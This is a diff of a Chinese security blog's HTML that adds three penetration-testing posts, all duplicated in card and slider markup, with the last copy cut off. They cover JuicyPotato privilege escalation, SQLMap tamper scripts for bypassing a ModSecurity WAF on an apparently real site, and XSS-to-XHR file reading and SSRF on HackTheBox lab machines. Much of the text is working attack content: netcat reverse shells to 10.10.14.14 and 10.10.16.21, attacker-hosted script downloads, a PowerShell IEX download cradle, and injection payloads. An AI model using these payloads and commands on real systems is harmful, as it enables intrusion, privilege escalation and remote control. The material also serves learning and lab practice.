@@ -118,6 +118,227 @@
 <!--  <div class="project-card">
   
   <div class="ctnWrap">
+    <a href="/2020/04/22/JuicyPotato%E6%8F%90%E6%9D%83/" class="title">JuicyPotato提权</a>
+    <section class="desc">
+  项目地址：https://github.com/ohpe/juicy-potato/
+0x01、前言Juicy Potato是在工具RottenPotatoNG （ms16-075提权exe）的基础上的扩展，使用更方便，使用范围也更广，利用的前提是获得了SeImpersonate或者SeAssignPrimaryToken权限，通常在webshell下使用
+whoami /pri   ##查找SeImpersonate and/or SeAssignPrimaryToken
+
+0x02、JuicyPotato功能自主选择CLSID
+-c ‘clsid’         #### clsid查找：http://ohpe.it/juicy-potato/CLSID/ 
+自定义COM监听端口
+-l : COM server listen port
+COM监听地址
+-m : COM server listen address (default 127.0.0.1)
+进程创建模块 
+-t createprocess call:  CreateProcessWithTokenW,  CreateProcessAsUser, &lt;*&gt; try both
+执行指定进程或脚本
+-p : program to launch
+为指定的执行进程选择参数
+-a : command line argument to pass to program (default NULL)
+RPC服务地址
+-k : RPC server ip address (default 127.0.0.1)
+RPC服务端口：
+-n : RPC server listen port (default 135)
+支持测试模块；测试并查找clsid
+-z only test CLSID and print token’s user
+0x03、JuicyPotato使用依赖于clsid：PS C:\users\userpool\desktop&gt; ./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c whoami&quot; -t *
+Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
+COM -&gt; recv failed with error: 10038查找替换http://ohpe.it/juicy-potato/CLSID/  很幸运2012 Standard中的第一条就成功了：
+./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;whoami&quot; -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;
+反弹shell：./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c c:\users\userpool\desktop\nc.exe -e cmd.exe 10.10.14.14 4444&quot; -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;或者将paylaod写入bat，-p参数执行bat
+echo &apos;C:\users\userpool\nc.exe -e cmd.exe 10.10.14.14 4444&apos; &gt; rev.bat
+./juicypotato.exe  -l 1337 -p c:\users\userpool\desktop\rev.bat -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;RDP下提权：直接弹出一个system权限窗口
+./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe  -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;0x04、CLSID快速验证[1]获取可用CLSID列表
+提取CLSID Powershell脚本 GetCLSID.ps1
+同级目录下需要有Join-Object.ps1
+GetCLSID.ps1执行成功后生成文件CLSID.list和CLSID.csv(在windows对应版本的目录下，如Windows_Server_2012_R2_Datacenter)
+Invoke-WebRequest -Uri http://10.10.14.14:8000/Join-Object.ps1 -outfile ./Join-Object.ps1
+Invoke-WebRequest -Uri http://10.10.14.14:8000/GetCLSID.ps1 -outfile ./GetCLSID.ps1
+powershell -ep bypass -f GetCLSID.ps1
+##Get-Content GetCLSID.ps1 | PowerShell.exe -noprofile -枚举所有满足条件的CLSID:
+New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null
+$CLSID = Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N=&apos;CLSID&apos;; E={$_.pschildname}} | where-object {$_.appid -ne $null}
+foreach($a in $CLSID)
+{
+Write-Host $a.CLSID
+}[2]批处理调用juicypotato.exe逐个测试CLSID
+test_clsid.bat:
+@echo off
+:: Starting port, you can change it
+set /a port=10000
+SETLOCAL ENABLEDELAYEDEXPANSION
+FOR /F %%i IN (CLSID.list) DO (
+   echo %%i !port!
+   juicypotato.exe -z -l !port! -c %%i &gt;&gt; result.log
+   set RET=!ERRORLEVEL!
+   :: echo !RET!
+   if &quot;!RET!&quot; == &quot;1&quot;  set /a port=port+1
+)0x05、限制条件
+需要支持SeImpersonate或者SeAssignPrimaryToken权限
+开启DCOM
+本地支持RPC或者远程服务器支持PRC并能成功登录
+能够找到可用的COM对象
+
+https://3gstudent.github.io/3gstudent.github.io/Windows%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7Juicy-Potato%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/
+
+
+</section>
+    <p class="sub">Apr 22, 2020</p>
+  </div>
+</div>-->
+<!---->
+<!--  <div class="project-card">
+  
+  <div class="ctnWrap">
+    <a href="/2020/04/19/%E4%B8%80%E6%AC%A1%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E5%BC%95%E5%8F%91%E7%9A%84SQLMAP%E4%BF%AE%E6%94%B9%E4%B9%8B%E8%B7%AF/" class="title">一次注入实战引发的SQLMAP修改之路
+</a>
+    <section class="desc">
+  首发于先知社区：https://xz.aliyun.com/t/6864
+#一、    前言SQLmap的payload修改一般有两种方式:  1、编写tamper  2、修改/添加sqlmap的xml文件语句自定义payload
+#二、    注入点Fuzz选中目标网站：http://www.xxxx.com/journals_desc.php?id=40单引号报错，对单引号进行转义，id=0=0测试回显正常，int型注入
+
+Order by 猜字段值为7
+Waf为Modsec，直接使用union select被拦截：
+
+Fuzz：
+单个union    #不拦截
+单个select    #不拦截
+Union select  #拦截
+union /**/ select #拦截
+/*!00000union*/ select #内联注释，不拦截
+/*!50000union*/ select 1,2,3,4,5,6,7 
+此处应该是涉及到强弱类型转换的问题，int为强类型，猜测对应的字段为弱类型解决方法：[1]使用string方法、但单引号’ 被被转义了,所以该方法行不通
+[2]采用报错注入
+#三、编写简单Tamper脚本绕过（使用自带的modsecurityzeroversioned.py不能绕过）
+报错注入过程中，发现主要过滤关键词from和函数concat（）
+1、concat()被过滤:concat()--&gt;concat/**/()  对应tamper脚本concat2concatcomment.py如下：
+#!/usr/bin/env python2
+&quot;&quot;&quot;
+Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
+See the file &apos;LICENSE&apos; for copying permission
+&quot;&quot;&quot;
+from lib.core.compat import xrange
+from lib.core.enums import PRIORITY
+__priority__ = PRIORITY.LOW
+def dependencies():
+pass
+def tamper(payload, **kwargs):
+return payload.replace(&quot;CONCAT&quot;,&quot;CONCAT/**/&quot;)2、from被过滤，from–&gt;/*!44144from*/对应tamper脚本from.py如下：
+#!/usr/bin/env python2
+&quot;&quot;&quot;
+Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
+See the file &apos;LICENSE&apos; for copying permission
+&quot;&quot;&quot;
+from lib.core.compat import xrange
+from lib.core.enums import PRIORITY
+__priority__ = PRIORITY.LOW
+def dependencies():
+pass
+def tamper(payload, **kwargs):
+return payload.replace(&quot;FROM&quot;,&quot;/*!44144FROM*/&quot;)验证：
+python sqlmap.py -u &quot;https://www.xxxx.com/journals_desc.php?id=66&quot; --level 3 --risk 3 -v 3 --tamper=&quot;from,concat2concatcomment&quot; --force-ssl  --technique=E
+--dbs读取（可以比对一下使用tamper脚本和使用tamper脚本后语句）payload in sqlmap:
+1AND (SELECT 8403 &#x2F;*!44144FROM*&#x2F;(SELECT COUNT(*),CONCAT&#x2F;**&#x2F;(0x716b707071,(SELECT REPEAT(0x34,1024)),0x71627a7a71,FLOOR(RAND(0)*2))x &#x2F;*!44144FROM*&#x2F; INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+--tables读取，很遗憾，读取失败
+
+再次把它的payload拿到本地测试，也是行不通的。语句很长，需要慢慢fuzz究竟是哪里被拦截、组合、函数、关键字？
+但是，，，，坑的是竟然不是因为过滤引起的？？？？
+#四、修改SQLmap的xml文件语句实在不行了，去用手工注了出来，但是用SQLmap就是跑不出来？？？再去看一下SQLmap的payload是不是有问题，咋一看没什么大问题，所以我一开始也忽略了，卡了好久。也就是这里涉及到了直接修改SQLmap自带的语句。大家自行比较一下下面这两条语句看看能不能看出问题~1、
+https://www.xxxx.com/journals_desc.php?id=40%20and%20updatexml/**/(1,concat/**//**/(0x7e,(select%20DISTINCT%20GROUP_CONCAT(table_name)/*!44144from*/%20%20%20information_schema.TABLES%20where%20table_schema=database())%20),1)2、
+https://www.xxxx.com/journals_desc.php?id=40%20and%20updatexml/**/(1,concat/**//**/(0x7e,(select%20DISTINCT%20GROUP_CONCAT(table_name)/*!44144from*/%20%20%20information_schema.`TABLES`%20where%20table_schema=database())%20),1)下面讲几个概念
+[1]table和colums在mysql中是特殊字符
+[2]反引号是sql语言的转义字符
+[3]在mysql中的sql语句为了避免与系统冲突给表名加上反引号  ，（但在指定其他数据库时不能加，否则会被认作是表）
+我们可以看到这里sqlmap的payload,对于information_schema.tables中的tables并没有加反引号,指引到/xml/queries.xml
+information_schema.tables --&gt; information_schema.`tables`当然，columns也需要修改
+information_schema.columns --&gt; information_schema.`columns`修改之后跑表：
+python sqlmap.py -u &quot;https://www.xxxx.com/journals_desc.php?id=66&quot; --level 3 --risk 3 -v 3 --tamper=&quot;from,concat2concatcomment&quot;   --technique=E   -D mililink_main --tablespayload in sqlamp（比对一下payload，看看效果）:
+66 AND (SELECT 9571 /*!44144FROM*/(SELECT COUNT(*),CONCAT/**/(0x716b7a6b71,(SELECT MID((IFNULL(CAST(table_name AS CHAR),0x20)),1,54) /*!44144FROM*/ INFORMATION_SCHEMA.`TABLES` WHERE table_schema IN (0x6d696c696c696e6b5f6d61696e) LIMIT 15,1),0x7171767071,FLOOR(RAND(0)*2))x /*!44144FROM*/ INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+跑列值也是一样的，就不多说了，直接上图
+
+#五、关于SQLmap自定义payload的一些思考SQLmap的payload修改，其实并不复杂。
+tamper脚本的编写，可以参考上边的from.py和concat2concatcomment.py，它其实是有固定格式的。简单的自定义paylaod只需要在def tamper(payload, **kwargs)函数中写入替换语句即可。可参考https://payloads.online/archivers/2017-06-08/1
+修改/添加sqlmap的xml文件语句来自定义payload。需要找到对应的xml文件，然后修改xml文件中的语句。    查询语句在\sqlmap\data\xml\ queries.xml定义，若想自定义查询语句则只需要修改/添加想要执行的查询语句即可，如上边对INFORMATION_SCHEMA.TABLES的修改不同的注入方式使用的语句则需要在对应的注入方式中的xml语句进行修改，在\sqlmap\data\xml\payloads\文件下
+
+假若我们需要修改error-base注入方式的payload，则需要在/xml/payload/error_based.xml中修改
+
+
+</section>
+    <p class="sub">Apr 19, 2020</p>
+  </div>
+</div>-->
+<!---->
+<!--  <div class="project-card">
+  
+  <div class="ctnWrap">
+    <a href="/2020/04/19/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%9D%B6%E5%9C%BA%E9%A2%98%E7%9B%AE%E7%9C%8BXHR/" class="title">从两道靶场题目看XHR</a>
+    <section class="desc">
+  首发于先知社区：https://xz.aliyun.com/t/7473/
+#0x01、什么是XHRXHR，也就是XMLHttpRequest，是现代浏览器都有的一个内置对象，使用 XMLHttpRequest对象可以与服务器交互。无需刷新整个页面即可从URL获取数据，允许网页在不影响用户的操作的情况下更新页面的局部内容，多应用于 AJAX 编程中。
+特别注意的是XMLHttpRequest 可以用于获取任何类型的数据，而不仅仅是XML，它甚至支持 HTTP 以外的协议（包括 file:// 和 FTP）
+#0x02、利用一：读取本地文件
+适用于XSS打到后台管理员，以普通用户身份构造payload发送给管理员，登录后台触发payload并查看回显（也就是拿到cookie能够登录后台的情况）
+以Hackthebox的book靶场为例：
+情景描述：普通用户能够上传pdf文件，且能够自定义Title和Author，管理员能够下载用户上传的pdf；登录管理员发现Title字段插入的xss解析并显示在管理员能够看到的pdf标题中
+
+验证：Title字段插入内容更改为
+1&lt;script&gt;document.write(Date());&lt;/script&gt;
+
+进一步利用：利用XHR读取本地文件
+本来直接想到的是在浏览器本地同源的情况下file协议读取：&lt;利用iframe的file协议&gt;
+&lt;iframe src=&quot;file:///etc/passwd&quot;&gt;&lt;/iframe&gt;
+没有回显
+&lt;script&gt;document.write(&apos;&lt;iframe src=file:///etc/passwd&gt;&lt;/iframe&gt;&apos;)&lt;/script&gt;还是没有回显
+姿势不够，直接使用iframe插入paylaod没有回显，但是说明了可以使用file协议，尝试使用XHR发送Ajax请求并利用File协议读取：
+&lt;script&gt;
+x=new XMLHttpRequest;
+x.onload=function(){
+document.write(this.responseText)
+};
+x.open(&quot;GET&quot;,&quot;file:///etc/passwd&quot;);
+x.send();
+ &lt;/script&gt;Tips：由于这里对Title内容没有字数限制，所以我直接插入完整paylaod，有字数限制的情况下可以写入js文件中，后面会讲到
+
+同样的方法可以直接读取到该服务器的用户ssh私钥进行登录
+#0x03、利用二：由XSS到SSRF之命令执行
+这个条件比较苛刻，需要有命令执行，但是对执行者的IP进行验证，这里以HackTheBox的Bankrobber中的例子为例
+情景描述：页面端有个backdoorchecker.php页面，能够执行dir命令(限制不严，很简单就绕过)，但是只允许本地执行，直接看代码（通过SQL注入已读取到源码）
+
+简易思路:现有XSS，尝试结合XMLHttpRequest借用本地账户进行操作：借用管理员身份打开backerdoorchecker.php绕过IP限制（即转换成SSRF），并构造payload绕过命令执行限制
+漏洞利用：借助smb执行我们攻击机上的nc反弹shell （smb服务可以借助impacket套件中的smbserver.py快速搭建）Payload：
+&lt;script&gt; var x = new XMLHttpRequest(); x.open(&quot;POST&quot;, &quot;backdoorchecker.php&quot;, true); x.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;); x.send(&apos;cmd=dir xxx || \\\\10.10.16.21\\ica\\nc.exe -e cmd.exe 10.10.16.21 9999&apos;);&lt;/script&gt;nc -lvvp 9999 即可回弹shell
+#0x04、一点小小扩展这里可以把payload写到js文件中，然后插入我们的js文件即可，关于如何编写XHR的js文件的链接会放到文末。这里针对利用二，还有另外的利用方式，即通过powershell IEX下载脚本并反弹PowerShellTcp.ps1并反弹。既然提到了js文件的方式，就以这种方式构造payload：XSS框直接插入：    
+Reverse.js文件内容如下：
+function paintfunc(){
+ var http = new XMLHttpRequest();
+     var url = &apos;http://localhost/admin/backdoorchecker.php&apos;;
+     var params = &apos;cmd=dir| powershell -c &quot;iex (New-Object Net.WebClient).DownloadString(\&apos;http://10.10.16.21:8000/Invoke-PowerShellTcp.ps1\&apos;);Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.21 -Port 9969&quot;&apos;;
+     http.open(&apos;POST&apos;, url, true);
+     http.setRequestHeader(&apos;Content-type&apos;, &apos;application/x-www-form-urlencoded&apos;);
+     http.send(params);
+}
+paintfunc();#0x05、题后话1）、关于XSS结合XHR还有更多利用，如不能登录后台的情况下添加管理员等
+2）、关于iframe没有回显的问题：这是由于iframe是通过浏览器本地同源来进行加载文件的，即不能通过网络加载，我们简单做个测试：创建iframe.html,写入如下语句
+&lt;iframe src=&quot;file:///F:/password.txt&quot;&gt;&lt;/iframe&gt;直接在本地直接打开
+
+放到网站目录下通过浏览器访问：
+
+链接：
+https://www.w3schools.com/xml/xml_http.asp 
+http://heartsky.info/2017/08/30/%E6%B5%85%E8%B0%88-XSS-%E5%8F%91%E9%80%81%E5%A4%96%E5%9F%9F%E8%AF%B7%E6%B1%82/
+https://blog.0daylabs.com/2014/11/01/xss-ex-filtrating-data-xmlhttprequest-js-pentesters-task-15-write/
+
+
+</section>
+    <p class="sub">Apr 19, 2020</p>
+  </div>
+</div>-->
+<!---->
+<!--  <div class="project-card">
+  
+  <div class="ctnWrap">
     <a href="/2020/04/19/multi-ways-file-download/" class="title">multi-ways-file-download</a>
     <section class="desc">
   这里我分为三个模块：Linux、Windows、常见语言环境
@@ -431,6 +652,276 @@ select id,updatexml(1,concat(user(),0x7e,version()),1) from user;select id from 
     <div class="box-content flex1">
         <div class="swiper-container">
             <div class="swiper-wrapper">
+                
+                    <a title="JuicyPotato提权" alt="JuicyPotato提权" href="/2020/04/22/JuicyPotato%E6%8F%90%E6%9D%83/"
+                       class="post-item swiper-slide flex flex-v">
+                        <div class="image">
+                            
+                                <img title="JuicyPotato提权" alt="JuicyPotato提权"
+                                     src="/images/default.jpg"></img>
+                            
+                        </div>
+                        <div class="content-warp flex1 flex flex-v">
+                            <div class="title">&lt; JuicyPotato提权 &gt;</div>
+                            <div class="content flex1">
+                                
+  项目地址：https://github.com/ohpe/juicy-potato/
+0x01、前言Juicy Potato是在工具RottenPotatoNG （ms16-075提权exe）的基础上的扩展，使用更方便，使用范围也更广，利用的前提是获得了SeImpersonate或者SeAssignPrimaryToken权限，通常在webshell下使用
+whoami /pri   ##查找SeImpersonate and/or SeAssignPrimaryToken
+
+0x02、JuicyPotato功能自主选择CLSID
+-c ‘clsid’         #### clsid查找：http://ohpe.it/juicy-potato/CLSID/ 
+自定义COM监听端口
+-l : COM server listen port
+COM监听地址
+-m : COM server listen address (default 127.0.0.1)
+进程创建模块 
+-t createprocess call:  CreateProcessWithTokenW,  CreateProcessAsUser, &lt;*&gt; try both
+执行指定进程或脚本
+-p : program to launch
+为指定的执行进程选择参数
+-a : command line argument to pass to program (default NULL)
+RPC服务地址
+-k : RPC server ip address (default 127.0.0.1)
+RPC服务端口：
+-n : RPC server listen port (default 135)
+支持测试模块；测试并查找clsid
+-z only test CLSID and print token’s user
+0x03、JuicyPotato使用依赖于clsid：PS C:\users\userpool\desktop&gt; ./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c whoami&quot; -t *
+Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
+COM -&gt; recv failed with error: 10038查找替换http://ohpe.it/juicy-potato/CLSID/  很幸运2012 Standard中的第一条就成功了：
+./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;whoami&quot; -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;
+反弹shell：./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c c:\users\userpool\desktop\nc.exe -e cmd.exe 10.10.14.14 4444&quot; -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;或者将paylaod写入bat，-p参数执行bat
+echo &apos;C:\users\userpool\nc.exe -e cmd.exe 10.10.14.14 4444&apos; &gt; rev.bat
+./juicypotato.exe  -l 1337 -p c:\users\userpool\desktop\rev.bat -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;RDP下提权：直接弹出一个system权限窗口
+./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe  -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;0x04、CLSID快速验证[1]获取可用CLSID列表
+提取CLSID Powershell脚本 GetCLSID.ps1
+同级目录下需要有Join-Object.ps1
+GetCLSID.ps1执行成功后生成文件CLSID.list和CLSID.csv(在windows对应版本的目录下，如Windows_Server_2012_R2_Datacenter)
+Invoke-WebRequest -Uri http://10.10.14.14:8000/Join-Object.ps1 -outfile ./Join-Object.ps1
+Invoke-WebRequest -Uri http://10.10.14.14:8000/GetCLSID.ps1 -outfile ./GetCLSID.ps1
+powershell -ep bypass -f GetCLSID.ps1
+##Get-Content GetCLSID.ps1 | PowerShell.exe -noprofile -枚举所有满足条件的CLSID:
+New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null
+$CLSID = Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N=&apos;CLSID&apos;; E={$_.pschildname}} | where-object {$_.appid -ne $null}
+foreach($a in $CLSID)
+{
+Write-Host $a.CLSID
+}[2]批处理调用juicypotato.exe逐个测试CLSID
+test_clsid.bat:
+@echo off
+:: Starting port, you can change it
+set /a port=10000
+SETLOCAL ENABLEDELAYEDEXPANSION
+FOR /F %%i IN (CLSID.list) DO (
+   echo %%i !port!
+   juicypotato.exe -z -l !port! -c %%i &gt;&gt; result.log
+   set RET=!ERRORLEVEL!
+   :: echo !RET!
+   if &quot;!RET!&quot; == &quot;1&quot;  set /a port=port+1
+)0x05、限制条件
+需要支持SeImpersonate或者SeAssignPrimaryToken权限
+开启DCOM
+本地支持RPC或者远程服务器支持PRC并能成功登录
+能够找到可用的COM对象
+
+https://3gstudent.github.io/3gstudent.github.io/Windows%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7Juicy-Potato%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/
+
+
+
+                            </div>
+                            <div class="post-tags">
+                                
+                            </div>
+                            <div class="other">
+                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
+                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
+                                <span><i class="iconfont icon-shijian"></i>Apr 22, 2020</span>
+                            </div>
+                        </div>
+                    </a>
+                
+                    <a title="一次注入实战引发的SQLMAP修改之路
+" alt="一次注入实战引发的SQLMAP修改之路
+" href="/2020/04/19/%E4%B8%80%E6%AC%A1%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E5%BC%95%E5%8F%91%E7%9A%84SQLMAP%E4%BF%AE%E6%94%B9%E4%B9%8B%E8%B7%AF/"
+                       class="post-item swiper-slide flex flex-v">
+                        <div class="image">
+                            
+                                <img title="一次注入实战引发的SQLMAP修改之路
+" alt="一次注入实战引发的SQLMAP修改之路
+"
+                                     src="/images/default.jpg"></img>
+                            
+                        </div>
+                        <div class="content-warp flex1 flex flex-v">
+                            <div class="title">&lt; 一次注入实战引发的SQLMAP修改之路
+ &gt;</div>
+                            <div class="content flex1">
+                                
+  首发于先知社区：https://xz.aliyun.com/t/6864
+#一、    前言SQLmap的payload修改一般有两种方式:  1、编写tamper  2、修改/添加sqlmap的xml文件语句自定义payload
+#二、    注入点Fuzz选中目标网站：http://www.xxxx.com/journals_desc.php?id=40单引号报错，对单引号进行转义，id=0=0测试回显正常，int型注入
+
+Order by 猜字段值为7
+Waf为Modsec，直接使用union select被拦截：
+
+Fuzz：
+单个union    #不拦截
+单个select    #不拦截
+Union select  #拦截
+union /**/ select #拦截
+/*!00000union*/ select #内联注释，不拦截
+/*!50000union*/ select 1,2,3,4,5,6,7 
+此处应该是涉及到强弱类型转换的问题，int为强类型，猜测对应的字段为弱类型解决方法：[1]使用string方法、但单引号’ 被被转义了,所以该方法行不通
+[2]采用报错注入
+#三、编写简单Tamper脚本绕过（使用自带的modsecurityzeroversioned.py不能绕过）
+报错注入过程中，发现主要过滤关键词from和函数concat（）
+1、concat()被过滤:concat()--&gt;concat/**/()  对应tamper脚本concat2concatcomment.py如下：
+#!/usr/bin/env python2
+&quot;&quot;&quot;
+Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
+See the file &apos;LICENSE&apos; for copying permission
+&quot;&quot;&quot;
+from lib.core.compat import xrange
+from lib.core.enums import PRIORITY
+__priority__ = PRIORITY.LOW
+def dependencies():
+pass
+def tamper(payload, **kwargs):
+return payload.replace(&quot;CONCAT&quot;,&quot;CONCAT/**/&quot;)2、from被过滤，from–&gt;/*!44144from*/对应tamper脚本from.py如下：
+#!/usr/bin/env python2
+&quot;&quot;&quot;
+Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
+See the file &apos;LICENSE&apos; for copying permission
+&quot;&quot;&quot;
+from lib.core.compat import xrange
+from lib.core.enums import PRIORITY
+__priority__ = PRIORITY.LOW
+def dependencies():
+pass
+def tamper(payload, **kwargs):
+return payload.replace(&quot;FROM&quot;,&quot;/*!44144FROM*/&quot;)验证：
+python sqlmap.py -u &quot;https://www.xxxx.com/journals_desc.php?id=66&quot; --level 3 --risk 3 -v 3 --tamper=&quot;from,concat2concatcomment&quot; --force-ssl  --technique=E
+--dbs读取（可以比对一下使用tamper脚本和使用tamper脚本后语句）payload in sqlmap:
+1AND (SELECT 8403 &#x2F;*!44144FROM*&#x2F;(SELECT COUNT(*),CONCAT&#x2F;**&#x2F;(0x716b707071,(SELECT REPEAT(0x34,1024)),0x71627a7a71,FLOOR(RAND(0)*2))x &#x2F;*!44144FROM*&#x2F; INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+--tables读取，很遗憾，读取失败
+
+再次把它的payload拿到本地测试，也是行不通的。语句很长，需要慢慢fuzz究竟是哪里被拦截、组合、函数、关键字？
+但是，，，，坑的是竟然不是因为过滤引起的？？？？
+#四、修改SQLmap的xml文件语句实在不行了，去用手工注了出来，但是用SQLmap就是跑不出来？？？再去看一下SQLmap的payload是不是有问题，咋一看没什么大问题，所以我一开始也忽略了，卡了好久。也就是这里涉及到了直接修改SQLmap自带的语句。大家自行比较一下下面这两条语句看看能不能看出问题~1、
+https://www.xxxx.com/journals_desc.php?id=40%20and%20updatexml/**/(1,concat/**//**/(0x7e,(select%20DISTINCT%20GROUP_CONCAT(table_name)/*!44144from*/%20%20%20information_schema.TABLES%20where%20table_schema=database())%20),1)2、
+https://www.xxxx.com/journals_desc.php?id=40%20and%20updatexml/**/(1,concat/**//**/(0x7e,(select%20DISTINCT%20GROUP_CONCAT(table_name)/*!44144from*/%20%20%20information_schema.`TABLES`%20where%20table_schema=database())%20),1)下面讲几个概念
+[1]table和colums在mysql中是特殊字符
+[2]反引号是sql语言的转义字符
+[3]在mysql中的sql语句为了避免与系统冲突给表名加上反引号  ，（但在指定其他数据库时不能加，否则会被认作是表）
+我们可以看到这里sqlmap的payload,对于information_schema.tables中的tables并没有加反引号,指引到/xml/queries.xml
+information_schema.tables --&gt; information_schema.`tables`当然，columns也需要修改
+information_schema.columns --&gt; information_schema.`columns`修改之后跑表：
+python sqlmap.py -u &quot;https://www.xxxx.com/journals_desc.php?id=66&quot; --level 3 --risk 3 -v 3 --tamper=&quot;from,concat2concatcomment&quot;   --technique=E   -D mililink_main --tablespayload in sqlamp（比对一下payload，看看效果）:
+66 AND (SELECT 9571 /*!44144FROM*/(SELECT COUNT(*),CONCAT/**/(0x716b7a6b71,(SELECT MID((IFNULL(CAST(table_name AS CHAR),0x20)),1,54) /*!44144FROM*/ INFORMATION_SCHEMA.`TABLES` WHERE table_schema IN (0x6d696c696c696e6b5f6d61696e) LIMIT 15,1),0x7171767071,FLOOR(RAND(0)*2))x /*!44144FROM*/ INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+跑列值也是一样的，就不多说了，直接上图
+
+#五、关于SQLmap自定义payload的一些思考SQLmap的payload修改，其实并不复杂。
+tamper脚本的编写，可以参考上边的from.py和concat2concatcomment.py，它其实是有固定格式的。简单的自定义paylaod只需要在def tamper(payload, **kwargs)函数中写入替换语句即可。可参考https://payloads.online/archivers/2017-06-08/1
+修改/添加sqlmap的xml文件语句来自定义payload。需要找到对应的xml文件，然后修改xml文件中的语句。    查询语句在\sqlmap\data\xml\ queries.xml定义，若想自定义查询语句则只需要修改/添加想要执行的查询语句即可，如上边对INFORMATION_SCHEMA.TABLES的修改不同的注入方式使用的语句则需要在对应的注入方式中的xml语句进行修改，在\sqlmap\data\xml\payloads\文件下
+
+假若我们需要修改error-base注入方式的payload，则需要在/xml/payload/error_based.xml中修改
+
+
+
+                            </div>
+                            <div class="post-tags">
+                                
+                            </div>
+                            <div class="other">
+                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
+                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
+                                <span><i class="iconfont icon-shijian"></i>Apr 19, 2020</span>
+                            </div>
+                        </div>
+                    </a>
+                
+                    <a title="从两道靶场题目看XHR" alt="从两道靶场题目看XHR" href="/2020/04/19/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%9D%B6%E5%9C%BA%E9%A2%98%E7%9B%AE%E7%9C%8BXHR/"
+                       class="post-item swiper-slide flex flex-v">
+                        <div class="image">
+                            
+                                <img title="从两道靶场题目看XHR" alt="从两道靶场题目看XHR"
+                                     src="/images/default.jpg"></img>
+                            
+                        </div>
+                        <div class="content-warp flex1 flex flex-v">
+                            <div class="title">&lt; 从两道靶场题目看XHR &gt;</div>
+                            <div class="content flex1">
+                                
+  首发于先知社区：https://xz.aliyun.com/t/7473/
+#0x01、什么是XHRXHR，也就是XMLHttpRequest，是现代浏览器都有的一个内置对象，使用 XMLHttpRequest对象可以与服务器交互。无需刷新整个页面即可从URL获取数据，允许网页在不影响用户的操作的情况下更新页面的局部内容，多应用于 AJAX 编程中。
+特别注意的是XMLHttpRequest 可以用于获取任何类型的数据，而不仅仅是XML，它甚至支持 HTTP 以外的协议（包括 file:// 和 FTP）
+#0x02、利用一：读取本地文件
+适用于XSS打到后台管理员，以普通用户身份构造payload发送给管理员，登录后台触发payload并查看回显（也就是拿到cookie能够登录后台的情况）
+以Hackthebox的book靶场为例：
+情景描述：普通用户能够上传pdf文件，且能够自定义Title和Author，管理员能够下载用户上传的pdf；登录管理员发现Title字段插入的xss解析并显示在管理员能够看到的pdf标题中
+
+验证：Title字段插入内容更改为
+1&lt;script&gt;document.write(Date());&lt;/script&gt;
+
+进一步利用：利用XHR读取本地文件
+本来直接想到的是在浏览器本地同源的情况下file协议读取：&lt;利用iframe的file协议&gt;
+&lt;iframe src=&quot;file:///etc/passwd&quot;&gt;&lt;/iframe&gt;
+没有回显
+&lt;script&gt;document.write(&apos;&lt;iframe src=file:///etc/passwd&gt;&lt;/iframe&gt;&apos;)&lt;/script&gt;还是没有回显
+姿势不够，直接使用iframe插入paylaod没有回显，但是说明了可以使用file协议，尝试使用XHR发送Ajax请求并利用File协议读取：
+&lt;script&gt;
+x=new XMLHttpRequest;
+x.onload=function(){
+document.write(this.responseText)
+};
+x.open(&quot;GET&quot;,&quot;file:///etc/passwd&quot;);
+x.send();
+ &lt;/script&gt;Tips：由于这里对Title内容没有字数限制，所以我直接插入完整paylaod，有字数限制的情况下可以写入js文件中，后面会讲到
+
+同样的方法可以直接读取到该服务器的用户ssh私钥进行登录
+#0x03、利用二：由XSS到SSRF之命令执行
+这个条件比较苛刻，需要有命令执行，但是对执行者的IP进行验证，这里以HackTheBox的Bankrobber中的例子为例
